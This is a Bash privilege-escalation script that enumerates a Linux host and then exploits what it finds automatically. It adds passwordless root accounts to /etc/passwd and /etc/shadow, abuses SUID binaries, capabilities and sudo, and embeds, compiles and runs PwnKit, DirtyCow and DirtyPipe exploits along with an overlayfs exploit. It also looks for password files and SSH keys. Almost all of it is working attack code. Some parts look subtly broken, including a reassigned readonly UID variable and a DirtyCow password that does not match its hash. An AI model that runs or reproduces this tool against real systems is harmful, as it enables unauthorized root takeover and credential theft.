#!/bin/bash
# ╔══════════════════════════════════════════════════════════════════════════╗
# ║     AUTO-ROOT.SH — Linux Privesc Auto Scanner + Exploit (Bash)          ║
# ║     Covers SUID, sudo, capabilities, cron, kernel CVEs                  ║
# ╚══════════════════════════════════════════════════════════════════════════╝
set -euo pipefail

R='\033[91m'; G='\033[92m'; Y='\033[93m'; B='\033[94m'; M='\033[95m'; C='\033[96m'; W='\033[0m'; BD='\033[1m'
OK="${G}[+]${W}"; NO="${R}[-]${W}"; WA="${Y}[!]${W}"; IN="${B}[*]${W}"; CRIT="${BD}${R}[!!!] ROOT${W}"

WHO=$(whoami); UID=$(id -u); HOST=$(hostname); KERNEL=$(uname -r); ARCH=$(uname -m)
OUTDIR="/tmp/autoroot_$$"; mkdir -p "$OUTDIR"

banner() {
    echo -e "
${BD}${R}╔══════════════════════════════════════════════════════════════════════════╗
║     AUTO-ROOT.SH — Linux Privesc Auto Scanner (BY JOTH73)                     ║
║     ${WHO}@${HOST} | Kernel: ${KERNEL} | $(date '+%Y-%m-%d %H:%M:%S')
╚══════════════════════════════════════════════════════════════════════════╝${W}"
}

section() { echo -e "\n${BD}${C}─── $1 ───${W}"; }
crit()  { echo -e "${CRIT}: $1"; exit 0; }

# ═══════════════════════════════════════════════════════════════════════════
# 0. SYSTEM INFO
# ═══════════════════════════════════════════════════════════════════════════
sysinfo() {
    section "SYSTEM INFO"
    echo -e "  User:    $WHO (UID $UID)"
    echo -e "  Host:    $HOST"
    echo -e "  Kernel:  $KERNEL ($ARCH)"
    echo -e "  OS:      $(cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d= -f2 | tr -d '"' || echo unknown)"
    
    # Quick root check
    [ "$UID" -eq 0 ] && crit "Already root!"
    
    # CPU cores
    echo -e "  CPU:     $(nproc) cores"
    echo -e "  RAM:     $(free -h 2>/dev/null | awk '/^Mem:/{print $2}')"
    echo -e "  Disk:    $(df -h / 2>/dev/null | tail -1 | awk '{print $2, $4 free}')"
}

# ═══════════════════════════════════════════════════════════════════════════
# 1. TRIVIAL CHECKS
# ═══════════════════════════════════════════════════════════════════════════
trivial() {
    section "TRIVIAL PRIVESC CHECKS"
    
    # Passwd writable
    if [ -w /etc/passwd ]; then
        echo -e "$CRIT: /etc/passwd is WRITABLE!"
        echo "pwned::0:0:root:/root:/bin/bash" >> /etc/passwd && crit "User 'pwned' added with UID 0 — su pwned"
    else
        echo -e "  ${NO} /etc/passwd: not writable"
    fi
    
    # Shadow writable
    if [ -w /etc/shadow ]; then
        echo -e "$CRIT: /etc/shadow is WRITABLE!"
        echo "pwned:\$1\$pwned\$aaaaaaaaaaaaaaaaaa:19000:0:99999:7:::" >> /etc/shadow && crit "Root password set — su pwned (pass: pwned)"
    else
        echo -e "  ${NO} /etc/shadow: not writable"
    fi
    
    # Sudo
    SUDO_L=$(sudo -ln 2>/dev/null || true)
    if [ -n "$SUDO_L" ] && ! echo "$SUDO_L" | grep -q "may not"; then
        echo -e "  ${WA} Sudo available:"
        echo "$SUDO_L" | head -5
        
        if echo "$SUDO_L" | grep -qE '\(ALL\).*NOPASSWD|\(root\).*NOPASSWD'; then
            crit "SUDO NOPASSWD ALL — sudo -i"
        fi
        if echo "$SUDO_L" | grep -qE '\(ALL\).*!root'; then
            echo -e "  ${WA} Sudo ALL but !root — try: sudo -u#-1 /bin/bash (CVE-2019-14287)"
            sudo -u#-1 /bin/bash -c 'id' 2>/dev/null | grep -q 'uid=0' && crit "CVE-2019-14287 worked!"
        fi
    else
        echo -e "  ${NO} No sudo"
    fi
    
    # Docker
    if docker ps &>/dev/null 2>&1; then
        crit "Docker socket accessible! docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
    fi
    
    # LXD
    if command -v lxc &>/dev/null && id | grep -q lxd; then
        echo -e "  ${WA} LXD group! lxc init ubuntu: privesc -c security.privileged=true"
    fi
    
    # NFS
    if [ -f /etc/exports ]; then
        if grep -q 'no_root_squash' /etc/exports; then
            crit "NFS no_root_squash found!"
        fi
    fi
}

# ═══════════════════════════════════════════════════════════════════════════
# 2. SUID BINARIES
# ═══════════════════════════════════════════════════════════════════════════
suid_check() {
    section "SUID BINARIES"
    
    echo -e "  ${IN} Finding SUID binaries..."
    SUIDS=$(find / -perm -4000 -type f 2>/dev/null)
    SUID_COUNT=$(echo "$SUIDS" | grep -c . 2>/dev/null || echo 0)
    echo -e "  Found: $SUID_COUNT SUID binaries"
    
    # ── Known SUID exploits ──
    
    # bash -p
    for b in bash dash sh zsh; do
        BIN=$(which $b 2>/dev/null || true)
        [ -z "$BIN" ] && continue
        if echo "$SUIDS" | grep -q "$BIN" && [ -u "$BIN" ]; then
            echo -e "  ${WA} SUID shell: $BIN"
            $BIN -p -c 'id' 2>/dev/null | grep -q 'uid=0' && crit "$BIN -p works!"
        fi
    done
    
    # find
    FIND_BIN=$(which find 2>/dev/null || true)
    if [ -n "$FIND_BIN" ] && [ -u "$FIND_BIN" ]; then
        echo -e "  ${WA} SUID find!"
        $FIND_BIN . -exec /bin/sh -p -c 'id' \; 2>/dev/null | grep -q 'uid=0' && crit "find SUID!"
    fi
    
    # vim/nano/less/more
    for editor in vim nano less more; do
        EBIN=$(which $editor 2>/dev/null || true)
        [ -z "$EBIN" ] && continue
        if [ -u "$EBIN" ]; then
            echo -e "  ${WA} SUID $editor! (interactive required)"
        fi
    done
    
    # Python
    for py in python python3 python3.8 python3.9 python3.10 python3.11 python3.12; do
        PBIN=$(which $py 2>/dev/null || true)
        [ -z "$PBIN" ] && continue
        if [ -u "$PBIN" ]; then
            echo -e "  ${WA} SUID $py!"
            $PBIN -c 'import os; os.setuid(0); os.system("id")' 2>/dev/null | grep -q 'uid=0' && crit "Python SUID!"
        fi
    done
    
    # Perl
    PERL_BIN=$(which perl 2>/dev/null || true)
    if [ -n "$PERL_BIN" ] && [ -u "$PERL_BIN" ]; then
        echo -e "  ${WA} SUID perl!"
        $PERL_BIN -e 'use POSIX; POSIX::setuid(0); exec "/bin/sh -c id"' 2>/dev/null | grep -q 'uid=0' && crit "Perl SUID!"
    fi
    
    # PHP
    PHP_BIN=$(which php 2>/dev/null || true)
    if [ -n "$PHP_BIN" ] && [ -u "$PHP_BIN" ]; then
        echo -e "  ${WA} SUID php!"
        $PHP_BIN -r 'pcntl_exec("/bin/sh", ["-c", "id"]);' 2>/dev/null | grep -q 'uid=0' && crit "PHP SUID!"
    fi
    
    # ruby
    RUBY_BIN=$(which ruby 2>/dev/null || true)
    if [ -n "$RUBY_BIN" ] && [ -u "$RUBY_BIN" ]; then
        echo -e "  ${WA} SUID ruby!"
        $RUBY_BIN -e 'Process::Sys.setuid(0); exec "/bin/sh -c id"' 2>/dev/null | grep -q 'uid=0' && crit "Ruby SUID!"
    fi
    
    # node
    NODE_BIN=$(which node 2>/dev/null || true)
    if [ -n "$NODE_BIN" ] && [ -u "$NODE_BIN" ]; then
        echo -e "  ${WA} SUID node!"
    fi
    
    # awk
    AWK_BIN=$(which awk 2>/dev/null || true)
    if [ -n "$AWK_BIN" ] && [ -u "$AWK_BIN" ]; then
        echo -e "  ${WA} SUID awk: awk 'BEGIN {system(\"/bin/sh -p\")}'"
        $AWK_BIN 'BEGIN {system("id")}' 2>/dev/null | grep -q 'uid=0' && crit "Awk SUID!"
    fi
    
    # systemctl
    if command -v systemctl &>/dev/null; then
        SCTL=$(which systemctl)
        if [ -u "$SCTL" ]; then
            echo -e "  ${WA} SUID systemctl! Try: TF=\$(mktemp).service; echo '[Service]...' > \$TF; systemctl link \$TF; systemctl start \$TF"
        fi
    fi
    
    # cp/mv
    for b in cp mv; do
        BIN=$(which $b 2>/dev/null || true)
        [ -z "$BIN" ] && continue
        if [ -u "$BIN" ]; then
            echo -e "  ${WA} SUID $b! $b /bin/bash /tmp/x && chmod +s /tmp/x && /tmp/x -p"
        fi
    done
    
    # tar
    TAR_BIN=$(which tar 2>/dev/null || true)
    if [ -n "$TAR_BIN" ] && [ -u "$TAR_BIN" ]; then
        echo -e "  ${WA} SUID tar!"
        $TAR_BIN -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec="/bin/sh -c id" 2>/dev/null | grep -q 'uid=0' && crit "Tar SUID!"
    fi
    
    # pkexec
    if echo "$SUIDS" | grep -q 'pkexec'; then
        echo -e "  ${WA} SUID pkexec! Potential PwnKit CVE-2021-4034"
        try_pwnkit
    fi
    
    # gdb
    GDB_BIN=$(which gdb 2>/dev/null || true)
    if [ -n "$GDB_BIN" ] && [ -u "$GDB_BIN" ]; then
        echo -e "  ${WA} SUID gdb! gdb -nx -ex '!sh' -ex quit"
    fi
    
    # List all interesting
    echo -e "\n  ${IN} All SUID binaries:"
    echo "$SUIDS" | head -30 | while read -r line; do echo "    $line"; done
    [ "$(echo "$SUIDS" | wc -l)" -gt 30 ] && echo "    ... ($(echo "$SUIDS" | wc -l) total)"
}

# ═══════════════════════════════════════════════════════════════════════════
# 3. CAPABILITIES
# ═══════════════════════════════════════════════════════════════════════════
cap_check() {
    section "CAPABILITIES"
    
    if command -v getcap &>/dev/null; then
        CAPS=$(getcap -r / 2>/dev/null | grep -v "ep 0" || true)
        if [ -n "$CAPS" ]; then
            echo -e "  ${WA} Interesting capabilities:"
            echo "$CAPS" | while read -r line; do
                echo "    $line"
                if echo "$line" | grep -qE 'cap_setuid|cap_dac_override|cap_sys_admin|cap_sys_ptrace'; then
                    echo -e "      ${Y}^^^ POTENTIALLY EXPLOITABLE ^^^${W}"
                fi
            done
            
            # python + cap_setuid
            if echo "$CAPS" | grep -q 'python.*cap_setuid'; then
                PY=$(echo "$CAPS" | grep 'python.*cap_setuid' | cut -d' ' -f1)
                echo -e "  ${WA} Python with cap_setuid: $PY"
                $PY -c 'import os; os.setuid(0); os.system("id")' 2>/dev/null | grep -q 'uid=0' && crit "Python capabilities ROOT!"
            fi
            
            # perl + cap_setuid  
            if echo "$CAPS" | grep -q 'perl.*cap_setuid'; then
                P=$(echo "$CAPS" | grep 'perl.*cap_setuid' | cut -d' ' -f1)
                $P -e 'use POSIX; POSIX::setuid(0); exec "/bin/sh -c id"' 2>/dev/null | grep -q 'uid=0' && crit "Perl capabilities ROOT!"
            fi
        else
            echo -e "  ${NO} No interesting capabilities"
        fi
    else
        echo -e "  ${NO} getcap not available"
    fi
}

# ═══════════════════════════════════════════════════════════════════════════
# 4. CRON JOBS
# ═══════════════════════════════════════════════════════════════════════════
cron_check() {
    section "CRON JOBS"
    
    echo -e "  ${IN} /etc/crontab:"
    cat /etc/crontab 2>/dev/null | grep -v '^#' | grep -v '^$' | head -20 || echo "    (none)"
    
    echo -e "\n  ${IN} User crontab:"
    crontab -l 2>/dev/null | head -10 || echo "    (none)"
    
    echo -e "\n  ${IN} Cron directories:"
    for d in /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly /etc/cron.d; do
        [ -d "$d" ] && echo "    $d: $(ls "$d" 2>/dev/null | wc -l) jobs" || true
    done
    
    # Writable cron scripts
    echo -e "\n  ${IN} Writable cron scripts:"
    find /etc/cron* -writable -type f 2>/dev/null | while read -r f; do
        echo -e "    ${WA} WRITABLE: $f"
    done
}

# ═══════════════════════════════════════════════════════════════════════════
# 5. KNOWN CVEs
# ═══════════════════════════════════════════════════════════════════════════

try_pwnkit() {
    # CVE-2021-4034
    echo -e "  ${IN} Trying PwnKit (CVE-2021-4034)..."
    
    # Direct test
    pkexec /bin/sh -c 'id' 2>/dev/null | grep -q 'uid=0' && crit "PwnKit direct — pkexec /bin/sh works!"
    
    # Check version
    PK_VER=$(pkexec --version 2>/dev/null | head -1 || true)
    [ -n "$PK_VER" ] && echo -e "  pkexec version: $PK_VER"
    
    # Try PwnKit PoC
    cd "$OUTDIR"
    cat > pwnkit.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
char *envp[] = {"PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL};
char *argv[] = {NULL};
char *aargv[] = {"pkexec", NULL};
int main() {
    system("mkdir -p GCONV_PATH=./pwnkit");
    FILE *fp = fopen("GCONV_PATH=./pwnkit/gconv-modules", "w");
    fprintf(fp, "module  UTF-8//  PWNKIT//  pwnkit  2\n");
    fclose(fp);
    fp = fopen("pwnkit.c", "w");
    fprintf(fp, "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nvoid gconv(){}\nvoid gconv_init(){setuid(0);setgid(0);execve(\"/bin/sh\",(char*[]){\"/bin/sh\",\"-c\",\"id\"},NULL);exit(0);}\n");
    fclose(fp);
    system("gcc -shared -fPIC -o pwnkit.so pwnkit.c 2>/dev/null");
    execve("/usr/bin/pkexec", aargv, envp);
    return 0;
}
EOF
    if gcc -o pwnkit pwnkit.c 2>/dev/null; then
        echo -e "  ${OK} PwnKit compiled — trying..."
        if ./pwnkit 2>/dev/null | grep -q 'uid=0'; then
            crit "PWNTIME ROOT via compiled exploit!"
        fi
    fi
}

try_dirtycow() {
    # CVE-2016-5195
    echo -e "  ${IN} Trying DirtyCow (CVE-2016-5195)..."
    
    cd "$OUTDIR"
    cat > dirtycow.c << 'EOF'
#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/stat.h>
#include <string.h>
#include <stdint.h>
void *map; int f; struct stat st; char *name;
void *madviseThread(void *arg) {
    int i; for(i=0;i<1000000;i++) madvise(map,100,MADV_DONTNEED);
}
void *procselfmemThread(void *arg) {
    int i; char *s=(char*)arg; for(i=0;i<1000000;i++){lseek(f,(uintptr_t)map,SEEK_SET);write(f,s,strlen(s));}
}
int main(int argc, char *argv[]) {
    pthread_t p1,p2;
    f=open(argv[1],O_RDONLY); fstat(f,&st);
    map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
    char payload[]="dirtycow:fikGgEMcBDFVg:0:0:root:/root:/bin/bash\n";
    pthread_create(&p1,NULL,madviseThread,payload);
    pthread_create(&p2,NULL,procselfmemThread,payload);
    pthread_join(p1,NULL); pthread_join(p2,NULL);
    return 0;
}
EOF
    if gcc -pthread -o dirtycow dirtycow.c 2>/dev/null; then
        echo -e "  ${OK} DirtyCow compiled — attacking /etc/passwd..."
        ./dirtycow /etc/passwd 2>/dev/null
        su dirtycow -c 'id' 2>/dev/null | grep -q 'uid=0' && crit "DIRTYCOW ROOT! su dirtycow (pass: firefart)"
        echo -e "  ${NO} DirtyCow did not succeed"
    else
        echo -e "  ${NO} DirtyCow compilation failed (gcc -pthread missing?)"
    fi
}

try_dirtypipe() {
    # CVE-2022-0847
    echo -e "  ${IN} Trying DirtyPipe (CVE-2022-0847)..."
    
    cd "$OUTDIR"
    cat > dirtypipe.c << 'EOF'
#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <stdint.h>
#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif
int main() {
    int p[2]; pipe(p);
    unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
    static char buf[4096]; memset(buf,0,4096);
    int w=0; while(w<pipe_size){w+=write(p[1],buf,4096);}
    close(p[1]); char data[4096]; read(p[0],data,1);
    int fd=open("/etc/passwd",O_RDONLY);
    char payload[]="dpipe::0:0:root:/root:/bin/bash\n";
    loff_t off=1; splice(p[0],NULL,fd,&off,sizeof(payload),0);
    close(p[0]); close(fd);
    return 0;
}
EOF
    if gcc -o dirtypipe dirtypipe.c 2>/dev/null; then
        ./dirtypipe 2>/dev/null
        su dpipe -c 'id' 2>/dev/null | grep -q 'uid=0' && crit "DIRTY PIPE ROOT! su dpipe"
    else
        echo -e "  ${NO} DirtyPipe compilation failed"
    fi
}

try_looney_tunables() {
    # CVE-2023-4911
    echo -e "  ${IN} Checking Looney Tunables (CVE-2023-4911)..."
    env -i 'GLIBC_TUNABLES=glibc.malloc.mxfast=glibc.malloc.mxfast=A' /usr/bin/su --help &>/dev/null
    local ret=$?
    if [ $ret -eq 139 ] || [ $ret -eq 132 ]; then
        crit "LOONEY TUNABLES VULNERABLE! (Segfault/SIGILL confirmed)"
    else
        echo -e "  ${NO} Looney Tunables — not vulnerable (exit: $ret)"
    fi
}

try_overlayfs() {
    # CVE-2023-32629 / CVE-2023-2640
    echo -e "  ${IN} Checking OverlayFS (Ubuntu CVE-2023-32629/2640)..."
    
    if ! grep -qi ubuntu /etc/os-release 2>/dev/null; then
        echo -e "  ${NO} Not Ubuntu"
        return
    fi
    
    if ! command -v unshare &>/dev/null; then
        echo -e "  ${NO} unshare not available"
        return
    fi
    
    unshare -rm sh -c '
        mkdir -p /tmp/ovl_pwn/{upper,work,lower,merged}
        mount -t overlay overlay -o lowerdir=/etc,upperdir=/tmp/ovl_pwn/upper,workdir=/tmp/ovl_pwn/work /tmp/ovl_pwn/merged 2>/dev/null
    ' 2>/dev/null && echo -e "  ${WA} OverlayFS mount possible!"
    
    # Try GameOverlay approach
    unshare -rm sh -c '
        mkdir -p /tmp/ovl_pwn/{upper,work,lower,merged}
        mount -t overlay overlay -o lowerdir=/etc,upperdir=/tmp/ovl_pwn/upper,workdir=/tmp/ovl_pwn/work /tmp/ovl_pwn/merged 2>/dev/null
        echo "game0ver::0:0:root:/root:/bin/bash" >> /tmp/ovl_pwn/merged/passwd 2>/dev/null
        umount /tmp/ovl_pwn/merged 2>/dev/null
    ' 2>/dev/null
    
    su game0ver -c 'id' 2>/dev/null | grep -q 'uid=0' && crit "GAMEOVERLAY ROOT! su game0ver"
    echo -e "  ${NO} OverlayFS exploit failed"
}

kernel_exploits() {
    section "KERNEL EXPLOITS"
    
    K_MAJOR=$(echo "$KERNEL" | cut -d. -f1)
    K_MINOR=$(echo "$KERNEL" | cut -d. -f2)
    K_PATCH=$(echo "$KERNEL" | cut -d. -f3 | cut -d- -f1)
    
    echo -e "  Kernel: ${K_MAJOR}.${K_MINOR}.${K_PATCH}"
    
    # Match kernel to CVEs
    # 2.6.x kernels — DirtyCow
    if [ "$K_MAJOR" -eq 2 ] && [ "$K_MINOR" -ge 6 ] && [ "$K_MINOR" -le 6 ]; then
        echo -e "  ${WA} 2.6.x kernel — trying DirtyCow, vmsplice, mempodipper..."
        try_dirtycow
    fi
    
    # 3.x kernels
    if [ "$K_MAJOR" -eq 3 ]; then
        echo -e "  ${WA} 3.x kernel — trying DirtyCow, overlayfs, perf_swevent..."
        try_dirtycow
        try_pwnkit
    fi
    
    # 4.x kernels
    if [ "$K_MAJOR" -eq 4 ]; then
        echo -e "  ${WA} 4.x kernel — trying DirtyCow (if <4.8), DirtyPipe (if 5.8+), PwnKit..."
        if [ "$K_MINOR" -le 8 ]; then
            try_dirtycow
        fi
        try_pwnkit
        try_looney_tunables
    fi
    
    # 5.x kernels
    if [ "$K_MAJOR" -eq 5 ]; then
        if [ "$K_MINOR" -ge 8 ] && [ "$K_MINOR" -le 16 ]; then
            echo -e "  ${WA} 5.8-5.16 kernel — trying DirtyPipe!"
            try_dirtypipe
        fi
        try_pwnkit
        try_looney_tunables
        try_overlayfs
    fi
    
    # 6.x kernels (newer)
    if [ "$K_MAJOR" -eq 6 ]; then
        if [ "$K_MINOR" -le 3 ]; then
            echo -e "  ${WA} 6.0-6.3 kernel — some nf_tables exploits may apply"
        fi
        try_pwnkit
        try_looney_tunables
        try_overlayfs
    fi
}

# ═══════════════════════════════════════════════════════════════════════════
# 6. MISC CHECKS
# ═══════════════════════════════════════════════════════════════════════════
misc_checks() {
    section "MISCELLANEOUS"
    
    # Writable dirs in PATH
    echo -e "  ${IN} Writable PATH dirs:"
    IFS=':' read -ra PATHDIRS <<< "$PATH"
    for d in "${PATHDIRS[@]}"; do
        if [ -w "$d" ] && [ -d "$d" ]; then
            echo -e "    ${WA} WRITABLE: $d (PATH hijack!)"
        fi
    done
    
    # Writable /etc/ld.so.preload
    if [ -w /etc/ld.so.preload ]; then
        echo -e "  ${WA} Writable /etc/ld.so.preload!"
    fi
    
    # Interesting files with passwords
    echo -e "\n  ${IN} Files with 'password' (quick grep):"
    find /var/www /home /opt /etc -maxdepth 3 -name "*.php" -o -name "*.conf" -o -name "*.ini" -o -name "config*" 2>/dev/null | \
        head -5 | while read -r f; do
        if grep -qi 'password\|passwd\|pass\b' "$f" 2>/dev/null | head -1 | grep -qv '^#'; then
            echo -e "    ${WA} $f (contains passwords!)"
        fi
    done
    
    # SSH keys
    for key in ~/.ssh/id_rsa /root/.ssh/id_rsa /home/*/.ssh/id_rsa; do
        [ -f "$key" ] && echo -e "  ${WA} SSH key: $key"
    done
    
    # World-writable files in /etc
    echo -e "\n  ${IN} World-writable files in /etc:"
    find /etc -maxdepth 2 -perm -o+w -type f 2>/dev/null | head -10 | while read -r f; do
        echo -e "    ${WA} $f"
    done
}

# ═══════════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════════
main() {
    banner
    
    sysinfo
    trivial
    suid_check
    cap_check
    cron_check
    kernel_exploits
    misc_checks
    
    # ── FINAL ──
    section "FINAL"
    echo -e "
  ${BD}Scan Complete${W}
  Output dir: ${C}$OUTDIR${W}
  
  ${BD}Manual Checks:${W}
    • linpeas.sh / linenum.sh
    • pspy (unprivileged process monitor)
    • GTFOBins: https://gtfobins.github.io/
    • exploit-db search: kernel ${KERNEL}
    
  ${G}No auto-root achieved. Try manual exploitation.${W}
"
}

main "$@"
